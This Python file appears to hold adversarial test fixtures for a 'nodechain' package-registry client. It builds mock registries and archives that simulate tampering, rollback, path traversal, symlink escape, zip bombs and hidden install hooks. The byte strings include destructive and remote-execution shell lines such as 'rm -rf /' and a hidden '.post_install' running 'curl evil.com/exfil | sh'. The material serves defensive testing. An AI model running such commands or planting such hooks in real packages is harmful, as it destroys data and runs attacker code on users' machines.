"""Adversarial test fixtures for remote registry attacks (v2.0.1).

Provides reusable malicious fixture builders for comprehensive attack surface
testing. Each fixture simulates a specific attack vector from the threat model.

Attack categories:
  R1: Registry-level attacks (compromise, stale metadata, protocol downgrade)
  P1: Package-level attacks (substitution, version rollback, certification forgery)
  A1: Archive-level attacks (path traversal, zip bombs, symlink escape, install hooks)
  N1: Network-level attacks (timeout, partial download, corrupted response)
  T1: Trust boundary attacks (sandbox downgrade, capability escalation)
"""

from __future__ import annotations

import hashlib
import io
import json
import tarfile
import time
import zipfile
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any


def _sha256_bytes(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def _sha256_dict(data: dict[str, Any]) -> str:
    return hashlib.sha256(
        json.dumps(data, sort_keys=True, separators=(",", ":")).encode("utf-8")
    ).hexdigest()


# ── Mock Transport ──────────────────────────────────────────────────────────


class AdversarialTransport:
    """Mock HTTP transport that simulates specific attack scenarios."""

    def __init__(self):
        self.routes: dict[str, tuple[int, dict[str, str], bytes]] = {}
        self.call_log: list[str] = []

    def add_route(self, path: str, status: int, headers: dict[str, str], body: bytes):
        self.routes[path] = (status, headers, body)

    def get(self, url: str, timeout: float = 30) -> tuple[int, dict[str, str], bytes]:
        self.call_log.append(url)
        for path, (status, headers, body) in self.routes.items():
            if url.endswith(path) or path in url:
                return status, headers, body
        return 404, {}, b'{"error": "not found"}'


# ── Valid Fixture Builders ──────────────────────────────────────────────────


def make_valid_registry_metadata(
    registry_id: str = "test-registry-001",
    protocol_versions: tuple[str, ...] = ("v1",),
) -> dict[str, Any]:
    """Create valid, self-consistent registry metadata."""
    from nodechain.sdk.remote_registry import RemoteRegistryMetadata
    meta = RemoteRegistryMetadata(
        schema_version="1.0",
        registry_id=registry_id,
        registry_name="Test Registry",
        registry_public_key="-----BEGIN PUBLIC KEY-----\nMOCK_KEY\n-----END PUBLIC KEY-----",
        registry_public_key_fingerprint="abc123def456",
        supported_protocol_versions=protocol_versions,
        packages_base_url="https://registry.example.com",
    )
    meta.metadata_digest = meta.compute_digest()
    meta.signature = "mock_registry_sig"
    return meta.to_dict()


def make_valid_package_metadata(
    package_id: str = "test_remote_pkg",
    version: str = "1.0.0",
    artifact_bytes: bytes = b"",
    certification_digest: str = "cert_sha256",
) -> dict[str, Any]:
    """Create valid package metadata matching given artifact bytes."""
    from nodechain.sdk.remote_registry import RemotePackageMetadata
    meta = RemotePackageMetadata(
        schema_version="1.0",
        package_id=package_id,
        version=version,
        artifact_digest=_sha256_bytes(artifact_bytes) if artifact_bytes else "placeholder",
        artifact_size=len(artifact_bytes) if artifact_bytes else 0,
        manifest_digest="manifest_sha256",
        certification_digest=certification_digest,
        publisher_public_key="-----BEGIN PUBLIC KEY-----\nMOCK_PUB\n-----END PUBLIC KEY-----",
        publisher_fingerprint="pub_fp_123",
        description="Test remote package",
        nodes=["TestNode"],
        capabilities=["read_only"],
        sandbox_profile="hardened_untrusted",
    )
    meta.metadata_digest = meta.compute_digest()
    meta.signature = "publisher_sig"
    return meta.to_dict()


def make_valid_artifact(files: dict[str, str] | None = None) -> bytes:
    """Create a valid tar.gz artifact."""
    files = files or {"node.py": "pass", "__init__.py": "", "package.yaml": "package_id: test\nversion: 1.0.0"}
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for name, content in files.items():
            data = content.encode("utf-8")
            info = tarfile.TarInfo(name=name)
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def make_valid_zip_artifact(files: dict[str, str] | None = None) -> bytes:
    """Create a valid zip artifact."""
    files = files or {"node.py": "pass", "__init__.py": ""}
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, content in files.items():
            zf.writestr(name, content)
    return buf.getvalue()


def make_full_valid_registry(
    package_id: str = "test_remote_pkg",
    version: str = "1.0.0",
    artifact_files: dict[str, str] | None = None,
) -> tuple[AdversarialTransport, dict, dict, bytes]:
    """Build a complete valid mock registry with transport.

    Returns (transport, registry_metadata, package_metadata, artifact_bytes)
    """
    transport = AdversarialTransport()
    artifact = make_valid_artifact(artifact_files)

    reg_data = make_valid_registry_metadata()
    pkg_data = make_valid_package_metadata(package_id, version, artifact)

    transport.add_route("/.well-known/nodechain-registry.json", 200, {},
                        json.dumps(reg_data).encode())
    transport.add_route(f"/packages/{package_id}/versions/{version}.json", 200, {},
                        json.dumps(pkg_data).encode())
    transport.add_route(f"/packages/{package_id}/versions/{version}/artifact", 200, {},
                        artifact)

    return transport, reg_data, pkg_data, artifact


# ── R1: Registry-Level Attack Fixtures ──────────────────────────────────────


def fixture_registry_serves_tampered_metadata() -> tuple[AdversarialTransport, dict]:
    """R1a: Registry metadata is tampered (digest won't match)."""
    transport = AdversarialTransport()
    data = make_valid_registry_metadata()
    data["registry_name"] = "Tampered by attacker"
    # Don't fix the digest — this simulates tampering after signing
    transport.add_route("/.well-known/nodechain-registry.json", 200, {},
                        json.dumps(data).encode())
    return transport, data


def fixture_registry_protocol_downgrade() -> tuple[AdversarialTransport, dict]:
    """R1b: Registry only supports an ancient protocol version."""
    transport = AdversarialTransport()
    data = make_valid_registry_metadata(protocol_versions=("v0",))
    transport.add_route("/.well-known/nodechain-registry.json", 200, {},
                        json.dumps(data).encode())
    return transport, data


def fixture_registry_stale_metadata(hours_old: int = 8760) -> tuple[AdversarialTransport, dict]:
    """R1c: Registry metadata timestamp is very old (potential replay)."""
    from nodechain.sdk.remote_registry import RemoteRegistryMetadata
    from datetime import datetime, timezone, timedelta

    old_time = (datetime.now(timezone.utc) - timedelta(hours=hours_old)).strftime("%Y-%m-%dT%H:%M:%SZ")
    meta = RemoteRegistryMetadata(
        registry_id="stale-registry",
        timestamp=old_time,
        supported_protocol_versions=("v1",),
    )
    meta.metadata_digest = meta.compute_digest()
    meta.signature = "stale_sig"

    transport = AdversarialTransport()
    transport.add_route("/.well-known/nodechain-registry.json", 200, {},
                        json.dumps(meta.to_dict()).encode())
    return transport, meta.to_dict()


def fixture_registry_wrong_fingerprint() -> tuple[AdversarialTransport, dict]:
    """R1d: Registry key fingerprint doesn't match expected."""
    transport = AdversarialTransport()
    data = make_valid_registry_metadata()
    data["registry_public_key_fingerprint"] = "different_fingerprint"
    # Fix digest so it passes digest check (but fingerprint is wrong)
    from nodechain.sdk.remote_registry import RemoteRegistryMetadata
    meta = RemoteRegistryMetadata.from_dict(data)
    meta.metadata_digest = meta.compute_digest()
    meta.signature = "sig"
    transport.add_route("/.well-known/nodechain-registry.json", 200, {},
                        json.dumps(meta.to_dict()).encode())
    return transport, meta.to_dict()


def fixture_registry_serves_500_error() -> AdversarialTransport:
    """R1e: Registry returns server error."""
    transport = AdversarialTransport()
    transport.add_route("/.well-known/nodechain-registry.json", 500, {},
                        b'{"error": "internal server error"}')
    return transport


def fixture_registry_serves_invalid_json() -> AdversarialTransport:
    """R1f: Registry returns invalid JSON."""
    transport = AdversarialTransport()
    transport.add_route("/.well-known/nodechain-registry.json", 200, {},
                        b'{invalid json<<<')
    return transport


# ── P1: Package-Level Attack Fixtures ───────────────────────────────────────


def fixture_package_substitution(
    package_id: str = "test_remote_pkg",
    version: str = "1.0.0",
) -> tuple[AdversarialTransport, bytes]:
    """P1a: Package metadata says artifact A, but registry serves artifact B."""
    transport = AdversarialTransport()

    real_artifact = make_valid_artifact({"node.py": "print('safe')"})
    wrong_artifact = make_valid_artifact({"node.py": "import os; os.system('rm -rf /')"})

    # Metadata describes real_artifact
    pkg_data = make_valid_package_metadata(package_id, version, real_artifact)
    transport.add_route("/.well-known/nodechain-registry.json", 200, {},
                        json.dumps(make_valid_registry_metadata()).encode())
    transport.add_route(f"/packages/{package_id}/versions/{version}.json", 200, {},
                        json.dumps(pkg_data).encode())
    # But serve the wrong artifact
    transport.add_route(f"/packages/{package_id}/versions/{version}/artifact", 200, {},
                        wrong_artifact)
    return transport, wrong_artifact


def fixture_package_version_rollback(
    package_id: str = "test_remote_pkg",
) -> tuple[AdversarialTransport, dict]:
    """P1b: Registry serves an old vulnerable version when latest is requested."""
    transport = AdversarialTransport()

    # Client requests version "2.0.0" (patched)
    # Registry serves metadata for "1.0.0" (vulnerable) at the 2.0.0 endpoint
    old_artifact = make_valid_artifact({"node.py": "# vulnerable version"})
    pkg_data = make_valid_package_metadata(package_id, "1.0.0", old_artifact)

    transport.add_route("/.well-known/nodechain-registry.json", 200, {},
                        json.dumps(make_valid_registry_metadata()).encode())
    transport.add_route(f"/packages/{package_id}/versions/2.0.0.json", 200, {},
                        json.dumps(pkg_data).encode())
    transport.add_route(f"/packages/{package_id}/versions/2.0.0/artifact", 200, {},
                        old_artifact)
    return transport, pkg_data


def fixture_package_missing_certification() -> tuple[AdversarialTransport, dict]:
    """P1c: Package has no certification digest (uncertified)."""
    transport = AdversarialTransport()
    artifact = make_valid_artifact()
    pkg_data = make_valid_package_metadata(artifact_bytes=artifact, certification_digest="")
    # Fix digest after modifying certification_digest
    from nodechain.sdk.remote_registry import RemotePackageMetadata
    meta = RemotePackageMetadata.from_dict(pkg_data)
    meta.metadata_digest = meta.compute_digest()
    meta.signature = "sig"
    pkg_data = meta.to_dict()
    transport.add_route("/.well-known/nodechain-registry.json", 200, {},
                        json.dumps(make_valid_registry_metadata()).encode())
    transport.add_route("/packages/test_remote_pkg/versions/1.0.0.json", 200, {},
                        json.dumps(pkg_data).encode())
    transport.add_route("/packages/test_remote_pkg/versions/1.0.0/artifact", 200, {},
                        artifact)
    return transport, pkg_data


def fixture_package_forged_capabilities() -> tuple[AdversarialTransport, dict]:
    """P1d: Package declares dangerous capabilities."""
    transport = AdversarialTransport()
    artifact = make_valid_artifact()
    pkg_data = make_valid_package_metadata()
    pkg_data["capabilities"] = ["network_access", "filesystem_write", "subprocess_exec"]

    # Fix digest for modified metadata
    from nodechain.sdk.remote_registry import RemotePackageMetadata
    meta = RemotePackageMetadata.from_dict(pkg_data)
    meta.metadata_digest = meta.compute_digest()
    meta.signature = "sig"

    transport.add_route("/.well-known/nodechain-registry.json", 200, {},
                        json.dumps(make_valid_registry_metadata()).encode())
    transport.add_route("/packages/test_remote_pkg/versions/1.0.0.json", 200, {},
                        json.dumps(meta.to_dict()).encode())
    transport.add_route("/packages/test_remote_pkg/versions/1.0.0/artifact", 200, {},
                        artifact)
    return transport, meta.to_dict()


def fixture_package_size_lie() -> tuple[AdversarialTransport, dict]:
    """P1e: Package metadata claims wrong artifact size."""
    transport = AdversarialTransport()
    artifact = make_valid_artifact()
    pkg_data = make_valid_package_metadata(artifact_bytes=artifact)
    pkg_data["artifact_size"] = 999999999  # Wrong size

    from nodechain.sdk.remote_registry import RemotePackageMetadata
    meta = RemotePackageMetadata.from_dict(pkg_data)
    meta.metadata_digest = meta.compute_digest()
    meta.signature = "sig"

    transport.add_route("/.well-known/nodechain-registry.json", 200, {},
                        json.dumps(make_valid_registry_metadata()).encode())
    transport.add_route("/packages/test_remote_pkg/versions/1.0.0.json", 200, {},
                        json.dumps(meta.to_dict()).encode())
    transport.add_route("/packages/test_remote_pkg/versions/1.0.0/artifact", 200, {},
                        artifact)
    return transport, meta.to_dict()


# ── A1: Archive-Level Attack Fixtures ───────────────────────────────────────


def make_path_traversal_tar() -> bytes:
    """A1a: Tar with ../../etc/passwd path traversal."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        data = b"malicious"
        info = tarfile.TarInfo(name="../../../etc/passwd")
        info.size = len(data)
        tar.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def make_absolute_path_tar() -> bytes:
    """A1b: Tar with /etc/shadow absolute path."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        data = b"malicious"
        info = tarfile.TarInfo(name="/etc/shadow")
        info.size = len(data)
        tar.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def make_symlink_escape_tar() -> bytes:
    """A1c: Tar with symlink pointing outside package directory."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        # Create a symlink that points outside
        link_info = tarfile.TarInfo(name="escape_link")
        link_info.type = tarfile.SYMTYPE
        link_info.linkname = "../../../../etc/passwd"
        tar.addfile(link_info)
    return buf.getvalue()


def make_executable_hook_tar() -> bytes:
    """A1d: Tar with executable install hook (setup.sh with exec bit)."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        # Regular file
        data = b"print('safe')"
        info = tarfile.TarInfo(name="node.py")
        info.size = len(data)
        tar.addfile(info, io.BytesIO(data))

        # Executable setup hook
        hook_data = b"#!/bin/bash\nrm -rf /tmp/evidence\n# malicious install hook"
        hook_info = tarfile.TarInfo(name="install_hook.bin")
        hook_info.size = len(hook_data)
        hook_info.mode = 0o755  # Executable
        tar.addfile(hook_info, io.BytesIO(hook_data))
    return buf.getvalue()


def make_deeply_nested_tar(depth: int = 100) -> bytes:
    """A1e: Tar with deeply nested paths (path length attack)."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        nested_path = "/".join(["dir"] * depth) + "/node.py"
        data = b"content"
        info = tarfile.TarInfo(name=nested_path)
        info.size = len(data)
        tar.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def make_zip_bomb() -> bytes:
    """A1f: Zip bomb — tiny compressed, huge decompressed."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        # 1MB of zeros compresses to tiny
        zf.writestr("bomb.txt", b"\x00" * (5 * 1024 * 1024))
    return buf.getvalue()


def make_too_many_files_tar(count: int = 600) -> bytes:
    """A1g: Tar with too many files (exceeds MAX_PACKAGE_FILES)."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for i in range(count):
            data = b"x"
            info = tarfile.TarInfo(name=f"file_{i}.txt")
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def make_hidden_install_script_tar() -> bytes:
    """A1h: Tar with hidden post-install script."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        data = b"print('safe')"
        info = tarfile.TarInfo(name="node.py")
        info.size = len(data)
        tar.addfile(info, io.BytesIO(data))

        # Hidden script
        hidden_data = b"#!/bin/sh\ncurl evil.com/exfil | sh"
        hidden_info = tarfile.TarInfo(name=".post_install")
        hidden_info.size = len(hidden_data)
        hidden_info.mode = 0o755
        tar.addfile(hidden_info, io.BytesIO(hidden_data))
    return buf.getvalue()


# ── N1: Network-Level Attack Fixtures ───────────────────────────────────────


class TimeoutTransport:
    """Transport that always times out."""

    def get(self, url: str, timeout: float = 30) -> tuple[int, dict[str, str], bytes]:
        from nodechain.sdk.remote_registry import TimeoutError
        raise TimeoutError(f"Connection timed out: {url}")


class PartialDownloadTransport:
    """Transport that returns truncated response."""

    def __init__(self, full_body: bytes, trunc_size: int):
        self.full_body = full_body
        self.trunc_size = trunc_size
        self.calls = 0
        self._reg_data = None

    def get(self, url: str, timeout: float = 30) -> tuple[int, dict[str, str], bytes]:
        self.calls += 1
        if "artifact" in url:
            return 200, {}, self.full_body[:self.trunc_size]
        if "well-known" in url:
            import json as _json
            if self._reg_data is None:
                self._reg_data = make_valid_registry_metadata()
            return 200, {}, _json.dumps(self._reg_data).encode()
        # Return full package metadata
        import json as _json
        return 200, {}, _json.dumps(
            make_valid_package_metadata(artifact_bytes=self.full_body)
        ).encode()


class CorruptedResponseTransport:
    """Transport that returns corrupted binary."""

    def get(self, url: str, timeout: float = 30) -> tuple[int, dict[str, str], bytes]:
        return 200, {}, b"\x00\xff\xfe\xfd\x00\x01\x02corrupted"


class SlowTransport:
    """Transport that simulates latency."""

    def __init__(self, routes: dict[str, tuple[int, dict, bytes]], delay: float = 0.1):
        self.routes = routes
        self.delay = delay

    def get(self, url: str, timeout: float = 30) -> tuple[int, dict[str, str], bytes]:
        time.sleep(self.delay)
        for path, (status, headers, body) in self.routes.items():
            if url.endswith(path) or path in url:
                return status, headers, body
        return 404, {}, b'{"error": "not found"}'


# ── T1: Trust Boundary Attack Scenarios ─────────────────────────────────────


def attempt_sandbox_downgrade() -> dict[str, Any]:
    """T1a: Try to downgrade sandbox from hardened_untrusted to none.

    This should be rejected — remote packages must use strongest sandbox.
    """
    return {
        "attack": "sandbox_downgrade",
        "attempt": "Set sandbox_profile to 'none' in remote package",
        "expected": "Rejected — remote_untrusted must use strongest preset",
    }


def attempt_capability_escalation() -> dict[str, Any]:
    """T1b: Try to add dangerous capabilities to remote package."""
    return {
        "attack": "capability_escalation",
        "attempt": "Declare network_access and subprocess_exec capabilities",
        "expected": "Rejected — consumption policy must deny dangerous capabilities",
    }


def attempt_trust_upgrade() -> dict[str, Any]:
    """T1c: Try to upgrade remote_untrusted to local_trusted."""
    return {
        "attack": "trust_upgrade",
        "attempt": "Change trust_level from remote_untrusted to local_trusted",
        "expected": "Rejected — is_upgrade_allowed returns False",
    }


def attempt_certification_bypass() -> dict[str, Any]:
    """T1d: Try to skip certification verification for remote package."""
    return {
        "attack": "certification_bypass",
        "attempt": "Install remote package without certification verification",
        "expected": "Rejected — certified_only policy enforced",
    }
